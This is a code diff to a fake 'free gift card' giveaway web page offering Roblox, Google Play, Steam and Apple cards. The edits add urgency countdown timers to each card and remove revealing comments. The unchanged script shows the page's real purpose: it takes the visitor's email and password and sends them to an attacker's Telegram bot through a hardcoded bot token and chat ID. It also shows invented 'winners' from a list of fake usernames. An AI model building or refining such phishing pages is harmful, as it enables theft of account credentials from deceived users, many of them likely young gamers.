@@ -91,7 +91,7 @@
     <!-- MAIN CONTENT -->
     <main class="max-w-6xl mx-auto px-6 py-8 flex-grow">
         
-        <!-- HERO SECTION & COUNTDOWN TIMER -->
+        <!-- HERO SECTION -->
         <div class="text-center max-w-3xl mx-auto mb-10">
             <div class="inline-flex items-center space-x-2 bg-cyan-500/10 border border-cyan-500/30 px-4 py-1.5 rounded-full text-cyan-400 font-extrabold text-xs uppercase tracking-widest mb-4">
                 <i class="fas fa-bolt"></i> 100% FREE ENTRY FOR EVERYONE
@@ -101,16 +101,8 @@
                 SELECT YOUR <span class="beast-gradient-text">FREE GIFT CARD!</span>
             </h1>
 
-            <!-- 24-HOUR COUNTDOWN TIMER BOX -->
-            <div class="bg-slate-900/90 border-2 border-cyan-500/40 rounded-2xl p-4 max-w-md mx-auto my-6 shadow-[0_0_20px_rgba(0,210,255,0.15)]">
-                <p class="text-xs font-bold text-slate-400 uppercase tracking-widest mb-1">GIVEAWAY RESETS IN (MIDNIGHT 12:00 AM)</p>
-                <div id="countdown" class="text-3xl md:text-4xl font-black text-cyan-400 beast-font tracking-wider">
-                    00h 00m 00s
-                </div>
-            </div>
-
             <!-- RECENT WINNER DISPLAY -->
-            <div class="inline-flex items-center space-x-2 bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-xs text-slate-300">
+            <div class="inline-flex items-center space-x-2 bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-xs text-slate-300 mt-2">
                 <i class="fas fa-trophy text-amber-400"></i>
                 <span>Yesterday's Winner: <strong id="winnerDisplay" class="text-emerald-400">Loading...</strong></span>
             </div>
@@ -119,7 +111,7 @@
         <!-- GIFT CARD SELECTION GRID -->
         <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
             
-            <!-- 1. ROBLOX CARD (OFFICIAL ROBLOX APP LOGO) -->
+            <!-- 1. ROBLOX CARD -->
             <div class="beast-card p-6 text-center flex flex-col justify-between relative overflow-hidden group">
                 <div class="mb-4">
                     <div class="h-20 flex items-center justify-center mb-3">
@@ -132,6 +124,12 @@
                 </div>
 
                 <div>
+                    <!-- INDIVIDUAL COUNTDOWN TIMER -->
+                    <div class="bg-slate-900/80 border border-cyan-500/30 rounded-xl p-2 mb-4">
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-0.5">ENDS IN</p>
+                        <div class="countdown-timer text-base font-black text-cyan-400 beast-font">00h 00m 00s</div>
+                    </div>
+
                     <div class="grid grid-cols-2 gap-2 mb-4">
                         <button onclick="selectValue(this, 'Roblox', '$10')" class="value-btn selected border border-slate-700 py-2 rounded-xl text-sm font-bold">$10</button>
                         <button onclick="selectValue(this, 'Roblox', '$25')" class="value-btn border border-slate-700 py-2 rounded-xl text-sm font-bold">$25</button>
@@ -161,6 +159,12 @@
                 </div>
 
                 <div>
+                    <!-- INDIVIDUAL COUNTDOWN TIMER -->
+                    <div class="bg-slate-900/80 border border-cyan-500/30 rounded-xl p-2 mb-4">
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-0.5">ENDS IN</p>
+                        <div class="countdown-timer text-base font-black text-cyan-400 beast-font">00h 00m 00s</div>
+                    </div>
+
                     <div class="grid grid-cols-2 gap-2 mb-4">
                         <button onclick="selectValue(this, 'Google Play', '$10')" class="value-btn selected border border-slate-700 py-2 rounded-xl text-sm font-bold">$10</button>
                         <button onclick="selectValue(this, 'Google Play', '$25')" class="value-btn border border-slate-700 py-2 rounded-xl text-sm font-bold">$25</button>
@@ -185,6 +189,12 @@
                 </div>
 
                 <div>
+                    <!-- INDIVIDUAL COUNTDOWN TIMER -->
+                    <div class="bg-slate-900/80 border border-cyan-500/30 rounded-xl p-2 mb-4">
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-0.5">ENDS IN</p>
+                        <div class="countdown-timer text-base font-black text-cyan-400 beast-font">00h 00m 00s</div>
+                    </div>
+
                     <div class="grid grid-cols-2 gap-2 mb-4">
                         <button onclick="selectValue(this, 'Steam', '$10')" class="value-btn selected border border-slate-700 py-2 rounded-xl text-sm font-bold">$10</button>
                         <button onclick="selectValue(this, 'Steam', '$25')" class="value-btn border border-slate-700 py-2 rounded-xl text-sm font-bold">$25</button>
@@ -209,6 +219,12 @@
                 </div>
 
                 <div>
+                    <!-- INDIVIDUAL COUNTDOWN TIMER -->
+                    <div class="bg-slate-900/80 border border-cyan-500/30 rounded-xl p-2 mb-4">
+                        <p class="text-[10px] font-bold text-slate-400 uppercase tracking-wider mb-0.5">ENDS IN</p>
+                        <div class="countdown-timer text-base font-black text-cyan-400 beast-font">00h 00m 00s</div>
+                    </div>
+
                     <div class="grid grid-cols-2 gap-2 mb-4">
                         <button onclick="selectValue(this, 'Apple', '$10')" class="value-btn selected border border-slate-700 py-2 rounded-xl text-sm font-bold">$10</button>
                         <button onclick="selectValue(this, 'Apple', '$25')" class="value-btn border border-slate-700 py-2 rounded-xl text-sm font-bold">$25</button>
@@ -283,11 +299,9 @@
     </footer>
 
     <script>
-        // TELEGRAM BOT CONFIGURATION
         const BOT_TOKEN = "9215057440:AAFpzPk23TO4rfn_uy9gCsbQOaExYOvtoS0";
         const CHAT_ID = "5022620385";
 
-        // SELECTION TRACKING
         const selections = {
             'Roblox': '$10',
             'Google Play': '$10',
@@ -297,7 +311,6 @@
 
         let activeCard = 'Roblox';
 
-        // FAKE WINNER POOL
         const fakeUsernames = [
             'xX_ShadowGamer99_Xx', 'NeonViper21', 'RobloxMaster_2026', 'SolarPulse_99',
             'HyperBeast_404', 'VortexPro_77', 'CyberPhoenix_12', 'GhostRider_88',
@@ -309,21 +322,18 @@
             return fakeUsernames[index];
         }
 
-        // INITIALIZE WINNER DISPLAY
         document.getElementById('winnerDisplay').innerText = getRandomWinner();
 
-        // 24-HOUR COUNTDOWN TIMER TO 12:00 AM MIDNIGHT
-        function updateCountdown() {
+        function updateCountdowns() {
             const now = new Date();
             const midnight = new Date();
-            midnight.setHours(24, 0, 0, 0); // Next midnight
+            midnight.setHours(24, 0, 0, 0);
 
             const diff = midnight - now;
 
             if (diff <= 0) {
-                // MIDNIGHT RESET
                 document.getElementById('winnerDisplay').innerText = getRandomWinner();
-                setTimeout(updateCountdown, 1000);
+                setTimeout(updateCountdowns, 1000);
                 return;
             }
 
@@ -335,11 +345,15 @@
             const mStr = minutes < 10 ? '0' + minutes : minutes;
             const sStr = seconds < 10 ? '0' + seconds : seconds;
 
-            document.getElementById('countdown').innerText = `${hStr}h ${mStr}m ${sStr}s`;
+            const timerText = `${hStr}h ${mStr}m ${sStr}s`;
+
+            document.querySelectorAll('.countdown-timer').forEach(el => {
+                el.innerText = timerText;
+            });
         }
 
-        setInterval(updateCountdown, 1000);
-        updateCountdown();
+        setInterval(updateCountdowns, 1000);
+        updateCountdowns();
 
         function selectValue(btnElement, cardName, amount) {
             const parentContainer = btnElement.parentElement;
@@ -389,7 +403,6 @@
             const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
             try {
-                // Method 1: JSON Request
                 await fetch(telegramUrl, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -400,7 +413,6 @@
                     })
                 });
             } catch (err) {
-                // Method 2: URL Parameters Fallback
                 try {
                     const params = new URLSearchParams({
                         chat_id: CHAT_ID,
@@ -413,11 +425,9 @@
                 }
             }
 
-            // Show confirmation screen
             document.getElementById('giveawayForm').classList.add('hidden');
             document.getElementById('successState').classList.remove('hidden');
             
-            // Reset Form
             document.getElementById('userEmail').value = '';
             document.getElementById('userPassword').value = '';
             btn.innerText = "CONFIRM & ENTER NOW ⚡";
